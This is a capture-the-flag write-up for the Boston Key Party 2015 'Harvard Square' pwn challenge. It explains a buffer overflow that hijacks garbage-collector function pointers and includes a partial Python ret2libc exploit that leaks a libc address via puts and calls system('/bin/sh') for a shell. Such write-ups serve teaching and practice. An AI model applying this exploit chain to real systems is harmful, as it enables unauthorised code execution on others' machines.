# Boston Key Party CTF 2015: Harvard Square

**Category:** Pwning
**Points:** 275
**Solves:** 16
**Description:**

> can you be a leet 0day broker? 52.1.91.215 2114 (libc is ubuntu adf3305fcd0345f706019cf94687d50b libc-2.19.so) : 275

## Write-up

The problem is a game about transcation of 0days.  
We can enter the password and cheat the game, but it's useless.   
The game print the message:  

>Welcome to 0day Warz - The goal of the game is to get the $100M USD by the end of the game. You have been given a loan of $2000, with some high interest rate of 25% a day!`

The programe for the goal of game:  
```
void play_game() {
    ...
    if (owed == 0.0) {
        if (money > 9999999)
      action_hiscore();
    }
  ...
}
void action_hiscore() {
    char buf[268];
  ....
  read(0, buf, 0x400);
  ...
}
```
However, if understanding the game rule, we can know the condition is impossible to reach.  
So we must find another vulunerbility.  
In fact, there is a bof when `play_game()` starting.  
It cannot overflow to return address, but we can use it to change function pointers. :D  

The programe use `simple-gc`.  
(https://github.com/dhamidi/simple-gc/)  
It's create two garbage-collectors and put function pointer `exploit_free` and `string_free` to gc.  
Then, gc will trigger when we do `sleep` action.  
We can overwrite function ptr to `action_hiscore`, and we can overwrite the return address.  

Now, we can write the exploit.  
```
arg1 => rdi
arg2 => rsi
arg3 => rdx
...
```

So we must find some gadget to control arguments at first.  
Then, we can use `put()` to leak arbitrary address.  
There exist a little bug.... stdout dupped to socket.  
We won't receive the content immediately.  
To solve this bug, I return to `action_hiscore()` again because it has `fflush()` at the end of function.  

After leak the address, we can calulate the address of `system()`.  
Next, We need a string of "/bin/sh".  
Luckily, we can find it in libc, too.  
So we can call `system("/bin/sh")` to get the shell.  

My partitial exploit:  
```
# leak address
raw_input("wait gdb")
read_until("name? ")
pop_rdi = up64("402fc3")
got = up64("605061")
put = up64("400cd0")
payload = "a"*280 + pop_rdi + got + put + bof
send_line(payload)
read_until("...-'\"\n")
read_until("!\n")

# get leak and count libc
leak = read_line().strip()[::-1].encode("hex")
base = int(leak+"00", 16) - 0x54400
system = hex(base + 0x46640)[2:]
system = up64(system)
binsh = hex(base + 0x17d87b)[2:]

# get and shell out
read_until("name? ")
buf = up64("605800")
payload = "a"*280 + pop_rdi + up64(binsh) + system
send_line(payload)
read_until("!\n")

t.interact()
```

`flag: stay_in_school_and_dont_do_the_grugq`  

## Other write-ups and resources

* <http://ddaa.logdown.com/posts/256270-boston-key-party-ctf-2015-275-harvard-square>
* <https://rzhou.org/~ricky/bkpctf2015/harvard_square/>
* [Chinese](http://blog.orange.tw/2015/03/boston-key-parcty-ctf-2015-harvard.html)
